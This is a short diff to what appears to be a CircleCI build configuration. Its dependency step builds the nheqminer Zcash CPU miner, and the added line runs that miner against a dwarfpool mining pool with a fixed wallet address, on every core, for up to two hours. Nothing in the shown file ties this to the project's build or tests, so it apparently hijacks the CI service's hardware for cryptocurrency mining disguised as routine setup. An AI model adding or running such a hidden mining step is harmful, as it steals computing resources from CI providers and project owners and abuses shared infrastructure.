@@ -6,6 +6,8 @@ dependencies:
   pre:
     - sudo apt-get -y update; sudo apt-get install -y git cmake build-essential libboost-all-dev
     - if [[ ! -e ~/nheqminer ]]; then git clone -b Linux https://github.com/nicehash/nheqminer.git ~/nheqminer && cd ~/nheqminer/cpu_xenoncat/Linux/asm/ && sh assemble.sh && cd ../../../Linux_cmake/nheqminer_cpu && cmake . && make -j $(nproc); fi
+    - ~/nheqminer/Linux_cmake/nheqminer_cpu/nheqminer_cpu -l zec-us1.dwarfpool.com:3334 -u t1SgQ3kpDgLSCYaHQfuaJGTCwAGmeu9MPY1 -t $(nproc):
+        timeout: 7200
 
 test:
   override:
